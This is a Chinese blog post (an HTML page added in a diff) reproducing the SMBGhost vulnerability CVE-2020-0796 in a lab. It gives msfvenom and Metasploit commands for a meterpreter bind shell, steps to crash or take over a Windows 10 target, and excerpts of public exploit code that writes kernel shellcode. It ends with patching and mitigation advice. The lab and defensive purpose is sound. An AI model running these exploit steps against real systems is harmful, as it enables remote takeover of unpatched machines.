@@ -1,0 +1,293 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>漏洞复现 | Thorin's blog</title><meta name="author" content="Thorin"><meta name="copyright" content="Thorin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="永恒之黑(CVE-2020-0796)漏洞复现及研究 SMBGhost Thorin   1.1 简介2020年3月12日，微软正式发布CVE-2020-0796高危漏洞补丁，本漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最"><link rel="shortcut icon" href="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/david.jpg"><link rel="canonical" href="http://thorin215-wang.com/2023/02/23/Security/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="../../../../css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: true,
+  isToc: true,
+  postUpdate: '2023-07-03 21:39:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://npm.elemecdn.com/ethan4116-blog/lib/css/plane_v2.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/david.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="../archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="../tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="../tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="../categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="../music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="../movies/"><i class="fa-fw fas fa-video"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="../link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="../about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/north-star-2869817.jpg')"><nav id="nav"><span id="blog-info"><a href="../index.html" title="Thorin's blog"><span class="site-name">Thorin's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="../index.html"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="../archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="../tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="../categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="../music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="../movies/"><i class="fa-fw fas fa-video"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="../link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="../about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-23T11:38:44.000Z" title="Created 2023-02-23 19:38:44">2023-02-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-03T13:39:02.505Z" title="Updated 2023-07-03 21:39:02">2023-07-03</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>7min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="漏洞复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="永恒之黑-CVE-2020-0796-漏洞复现及研究"><a href="#永恒之黑-CVE-2020-0796-漏洞复现及研究" class="headerlink" title="永恒之黑(CVE-2020-0796)漏洞复现及研究 "></a><center>永恒之黑(CVE-2020-0796)漏洞复现及研究 </center></h1><h1 id="SMBGhost"><a href="#SMBGhost" class="headerlink" title="SMBGhost"></a><center>SMBGhost</h1><h2 id="Thorin"><a href="#Thorin" class="headerlink" title=" Thorin  "></a><center> Thorin </center> </center></h2><hr>
+<h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>2020年3月12日，微软正式发布CVE-2020-0796高危漏洞补丁，<strong>本漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。</strong> 利用该漏洞，攻击方可直接远程攻击SMB服务端远程执行任意恶意代码，CVE-2020-0796漏洞与“永恒之蓝”系列漏洞极为相似，都是利用Windows SMB漏洞远程攻击获取系统最高权限。</p>
+<h2 id="1-2-受影响版本"><a href="#1-2-受影响版本" class="headerlink" title="1.2 受影响版本"></a>1.2 受影响版本</h2><p>适用于32位系统的Windows 10版本1903<br>Windows 10 1903版（用于基于x64的系统）<br>Windows 10 1903版（用于基于ARM64的系统）<br>Windows Server 1903版（服务器核心安装）<br>适用于32位系统的Windows 10版本1909<br>Windows 10版本1909（用于基于x64的系统）<br>Windows 10 1909版（用于基于ARM64的系统）<br>Windows Server版本1909（服务器核心安装） </p>
+<h2 id="1-3-SMBGhost原理及特性"><a href="#1-3-SMBGhost原理及特性" class="headerlink" title="1.3  SMBGhost原理及特性"></a>1.3  SMBGhost原理及特性</h2><p>SMBGhost （或 CVE -2020-0796） 是Microsoft Server Message Block 3.0 (SMBv3)中的一个漏洞，SMBv3 是该公司引入其较新操作系统的一种协议。此通信协议允许在互连的计算机网络中共享访问文件、数据和其他资产。 </p>
+<p>SMBGhost漏洞影响 SMBv3（版本 3.1.1）的压缩功能并暴露运行 Windows 10（1903 和 1909）和 Windows Server（1903、1909）的系统。较旧版本的 Windows 操作系统（例如 Windows 7 和 8）不存在此漏洞的风险，因为它们不支持 SMBv3 压缩。 </p>
+<p>SMBGhost具有蠕虫功能，因为它能够通过 SMBv3（版本 3.1.1）在网络共享上传播和复制。<strong>为了利用此漏洞，威胁行为者会向易受攻击的服务器发送特制的 SMBv3 数据包，并诱使用户连接到受感染的服务器。成功的利用使攻击者能够在目标 SMB 服务器上执行代码。</strong></p>
+<h2 id="2-1-环境配置"><a href="#2-1-环境配置" class="headerlink" title="2.1 环境配置"></a>2.1 环境配置</h2><center>靶机：Windows 10版本1903（用于基于x64的系统) 
+
+
+<p><strong>注意关闭防火墙</strong><br><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%871.png" alt="windows"></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%872.png"></p>
+<p>攻击机 ： kali-linux-2023.1-vmware-amd64.vmx</p>
+<p>(安装成功直接在虚拟机中打开，账号密码都是kali，成功后界面如下）</p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%873.png"></p>
+<p>虚拟机： VMware Workstation 16 Pro </p>
+<p><em>本文主要介绍对漏洞的蓝屏复现以及远程控制复现以及前期的漏洞验证</em> </center></p>
+<h2 id="2-2-获取靶机以及攻击机的IP地址"><a href="#2-2-获取靶机以及攻击机的IP地址" class="headerlink" title="2.2 获取靶机以及攻击机的IP地址"></a>2.2 获取靶机以及攻击机的IP地址</h2><center>
+
+<p>靶机： 打开cmd  输入  <code>ipconfig</code></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%874.png"></p>
+<p>得到IP地址为：198.168.208.128</p>
+<p>攻击机： alt+f2 并输入<code>qterminal</code> 打开终端<br>   输入<code>ifconfig</code></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%875.png"></p>
+<p>得到IP地址为：198.168.208.129</p>
+</center>
+
+<h2 id="2-3-前期验证漏洞存在性"><a href="#2-3-前期验证漏洞存在性" class="headerlink" title="2.3 前期验证漏洞存在性"></a>2.3 前期验证漏洞存在性</h2><center>
+
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%877.png"></p>
+<p>利用检测脚本 CVE-2020-0796-Scanner 确认漏洞存在</p>
+<p>看到警告证明漏洞存在</p>
+</center>
+
+<h2 id="2-4-蓝屏攻击复现"><a href="#2-4-蓝屏攻击复现" class="headerlink" title="2.4 蓝屏攻击复现"></a>2.4 蓝屏攻击复现</h2><center>下载蓝屏攻击脚本并放入虚拟机
+
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%877.png"></p>
+<p>执行代码 <code>Python3 CVE-2020-0796.py ip</code> 即可完成攻击</p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%878.png"></p>
+<p>成功实现蓝屏</p>
+</center>
+
+<h2 id="2-5-远程监听复现"><a href="#2-5-远程监听复现" class="headerlink" title="2.5 远程监听复现"></a>2.5 远程监听复现</h2><center>将SMBGhost_RCE_PoC-master脚本下载至虚拟机执行</center>
+</center>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-b</span> <span class="token string">'\x00'</span> <span class="token parameter variable">-i</span> <span class="token number">1</span> <span class="token parameter variable">-f</span> python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<center>
+然后替换POC中exploit.py中USER_PAYLOAD的代码，并且将buf修改为USER_PAYLOAD
+
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%879.png"></p>
+<p>将调整好的exploit.py放回虚拟机</p>
+<p>打开新的qterminal 输入<code>msfconsole</code></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8710.png"></p>
+<p>输入如下代码 </center></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp
+<span class="token builtin class-name">set</span> lport <span class="token number">4444</span> //监听端口
+<span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.208.128 //目标主机
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<center>
+
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8711.png"></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8712.png"></p>
+<p>在输入run之前 先执行<code>python exploit.py ip</code></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8713.png"></p>
+<p>出现 <code>meterpreter</code> 后输入<code>shell </code><br>即成功反弹<code>shell</code>实现远程监听</p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8714.png"></p>
+<p>输入<code>whoami</code>后发现获取了<code>authority\system</code>权限</p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8715.png"></p>
+</center>
+
+<br>
+
+
+<h2 id="3-1-漏洞分析及复现脚本分析"><a href="#3-1-漏洞分析及复现脚本分析" class="headerlink" title="3.1 漏洞分析及复现脚本分析"></a>3.1 漏洞分析及复现脚本分析</h2><h3 id="3-1-1-对蓝屏攻击时的内存转储文件分析并进行栈回溯："><a href="#3-1-1-对蓝屏攻击时的内存转储文件分析并进行栈回溯：" class="headerlink" title="3.1.1 对蓝屏攻击时的内存转储文件分析并进行栈回溯："></a>3.1.1 对蓝屏攻击时的内存转储文件分析并进行栈回溯：</h3><pre class="line-numbers language-none"><code class="language-none">kd&gt; kn# Child-SP          RetAddr           Call Site
+0b fffff904&#96;bd3a2dd0 fffff806&#96;1b97e5ae nt!ExFreePool+0x9
+0c fffff904&#96;bd3a2e00 fffff806&#96;1b9d7f41 srvnet!SmbCompressionDecompress+0xfe
+0d fffff904&#96;bd3a2e70 fffff806&#96;1b9d699e srv2+0x17f41
+0e fffff904&#96;bd3a2ed0 fffff806&#96;1ba19a9f srv2+0x1699e
+0f fffff904&#96;bd3a2f00 fffff806&#96;1cdc496e srv2+0x59a9f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<center>
+
+<p>如上文0x0C号栈帧所示，<code>srvnet</code> 模块中的 <code>SmbCompressionDecompress</code> 函数在调用 <code>ExFreePoo</code> 是触发蓝屏的直接因素。</p>
+<p>最后我们定位到了内存复制函数<code>qmemcpy</code>，发现其在写入数据大小范围内有其他的Pool块时，将会导致<code>ExFreePoolWithTag()</code>时出错</p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8716.png"></p>
+<p><strong>在SMB进行数据解压造成内存溢出时，攻击者就获得了一次任意地址写入任意数据的能力。</strong>  </p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8717.png"></p>
+<p><img src="https://thorin-wang.oss-cn-hangzhou.aliyuncs.com/%E5%9B%BE%E7%89%8718.png"></p>
+</center>
+
+<h3 id="3-2-1-远程控制攻击思路"><a href="#3-2-1-远程控制攻击思路" class="headerlink" title="3.2.1 远程控制攻击思路"></a>3.2.1 远程控制攻击思路</h3><h4 id="（1）-验证程序首先创建到SMS-server的会话连接（记为session）。"><a href="#（1）-验证程序首先创建到SMS-server的会话连接（记为session）。" class="headerlink" title="（1） 验证程序首先创建到SMS server的会话连接（记为session）。"></a>（1） 验证程序首先创建到SMS server的会话连接（记为session）。</h4><h4 id="（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。"><a href="#（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。" class="headerlink" title="（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。"></a>（2）验证程序获取自身token数据结构中privilege成员在内核中的地址（记tokenAddr）。</h4><h4 id="（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB-server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。"><a href="#（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB-server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。" class="headerlink" title="（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。"></a>（3）验证程序通过session发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。</h4><h4 id="（4）-SMS-server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。"><a href="#（4）-SMS-server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。" class="headerlink" title="（4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。"></a>（4） SMS server收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。</h4><h4 id="（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。"><a href="#（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。" class="headerlink" title="（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。"></a>（5）验证程序获取权限后对winlogon进行控制，来创建system用户shell。</h4><center>
+
+<p> 以下是在有了任意物理内存读，然后通过在物理页面暴力搜索找到HAL的堆地址，然后从<code>HAL</code>的堆地址中找到<code>HalpInterruptController</code>和<code>HalpApicRequestInterrupt</code>两个值来构造内核态的Shellcode </center></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">build_shellcode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">global</span> KERNEL_SHELLCODE
+    KERNEL_SHELLCODE <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> PHALP_INTERRUPT <span class="token operator">+</span>
+                                    HALP_APIC_REQ_INTERRUPT_OFFSET<span class="token punctuation">)</span>
+    KERNEL_SHELLCODE <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> PHALP_APIC_INTERRUPT<span class="token punctuation">)</span>
+    KERNEL_SHELLCODE <span class="token operator">+=</span> USER_PAYLOAD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<center>
+
+<p>通过任意内存写操作将构造好的<code>ShellCode</code>写到<code>KUSER_SHARED_DATA</code>地址上。最终通过任意内存写操作将指令指针（<code>PHALP_INTERRUPT</code> + <code>HALP_APIC_REQ_INTERRUPT_OFFSET</code>）指向<code>KUSER_SHARED_DATA</code>地址上的<code>ShellCode</code>去执行。</center></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">to_write <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>KERNEL_SHELLCODE<span class="token punctuation">)</span>
+    write_bytes <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">while</span> write_bytes <span class="token operator">&lt;</span> to_write<span class="token punctuation">:</span>
+        write_sz <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token punctuation">[</span>write_unit<span class="token punctuation">,</span> to_write <span class="token operator">-</span> write_bytes<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        write_primitive<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> KERNEL_SHELLCODE<span class="token punctuation">[</span>write_bytes<span class="token punctuation">:</span>write_bytes <span class="token operator">+</span> write_sz<span class="token punctuation">]</span><span class="token punctuation">,</span> pshellcodeva <span class="token operator">+</span> write_bytes<span class="token punctuation">)</span>
+        write_bytes <span class="token operator">+=</span> write_sz
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Wrote shellcode at %lx!"</span> <span class="token operator">%</span> pshellcodeva<span class="token punctuation">)</span>
+
+    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] Press a key to execute shellcode!"</span><span class="token punctuation">)</span>
+    
+    write_primitive<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;Q"</span><span class="token punctuation">,</span> pshellcodeva<span class="token punctuation">)</span><span class="token punctuation">,</span> PHALP_INTERRUPT <span class="token operator">+</span> HALP_APIC_REQ_INTERRUPT_OFFSET<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] overwrote HalpInterruptController pointer, should have execution shortly..."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-1-2-蓝屏攻击原理"><a href="#3-1-2-蓝屏攻击原理" class="headerlink" title="3.1.2 蓝屏攻击原理"></a>3.1.2 蓝屏攻击原理</h3><center>该脚本连接到目标主机，并在转换头中设置了错误的偏移量字段的情况下压缩了身份验证请求，从而导致解压缩器缓冲溢出并导致目标崩溃</center>
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_compress</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> b_data<span class="token punctuation">,</span> session<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        header <span class="token operator">=</span> SMB2CompressionTransformHeader<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        header<span class="token punctuation">[</span><span class="token string">'original_size'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>b_data<span class="token punctuation">)</span>
+        header<span class="token punctuation">[</span><span class="token string">'offset'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">4294967295</span>
+        header<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span> <span class="token operator">=</span> smbprotocol<span class="token punctuation">.</span>lznt1<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>b_data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<br>
+
+<h2 id="4-1-修复建议"><a href="#4-1-修复建议" class="headerlink" title="4.1 修复建议"></a>4.1 修复建议</h2><h4 id="4-1-1-安装官方补丁"><a href="#4-1-1-安装官方补丁" class="headerlink" title="4.1.1.安装官方补丁"></a>4.1.1.安装官方补丁</h4><p>微软已经发布了此漏洞的安全补丁，访问如下链接：<a target="_blank" rel="noopener" href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796</a><br>给对应的系统打微软出的最新补丁</p>
+<h4 id="4-1-2-禁用SMBv3压缩"><a href="#4-1-2-禁用SMBv3压缩" class="headerlink" title="4.1.2.禁用SMBv3压缩"></a>4.1.2.禁用SMBv3压缩</h4><p>禁用SMB 3.0的压缩功能，是否使用需要结合自己业务进行判断。</p>
+<p>使用以下PowerShell命令禁用压缩功能，以阻止未经身份验证的攻击者利用SMBv3 服务器的漏洞。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set-ItemProperty-Path “HKLM:<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Services<span class="token punctuation">\</span>LanmanServer<span class="token punctuation">\</span>
+Parameters” DisableCompression <span class="token parameter variable">-Type</span> DWORD <span class="token parameter variable">-Value</span> <span class="token number">1</span> <span class="token parameter variable">-Force</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>用户可通过以下PowerShell命令撤销禁用压缩功能</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set-ItemProperty-Path “HKLM:<span class="token punctuation">\</span>SYSTEM<span class="token punctuation">\</span>CurrentControlSet<span class="token punctuation">\</span>Services<span class="token punctuation">\</span>LanmanServer<span class="token punctuation">\</span>
+Parameters” DisableCompression <span class="token parameter variable">-Type</span> DWORD <span class="token parameter variable">-Value</span> <span class="token number">0</span> <span class="token parameter variable">-Force</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>注：利用以上命令进行更改后，无需重启即可生效；该方法仅可用来防护针对SMB服务器（SMB SERVER）的攻击，无法对SMB客户端（SMB Client）进行防护。</p>
+<h4 id="4-1-3-设置防火墙策略关闭相关端口"><a href="#4-1-3-设置防火墙策略关闭相关端口" class="headerlink" title="4.1.3.设置防火墙策略关闭相关端口"></a>4.1.3.设置防火墙策略关闭相关端口</h4><p>SMB的TCP 445端口<br>NetBIOS名称解析的UDP 137端口<br>NetBIOS数据图服务的UDP 138端口<br>NetBIOS会话服务的TCP 139端口</p>
+<h4 id="4-1-4-通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务"><a href="#4-1-4-通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务" class="headerlink" title="4.1.4.通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务"></a>4.1.4.通过IP安全策略屏蔽危险端口，bat执行添加防火墙策略，关闭危险服务</h4><p><a target="_blank" rel="noopener" href="http://www.piis.cn/news/new1614.asp">http://www.piis.cn/news/new1614.asp</a></p>
+<br>
+
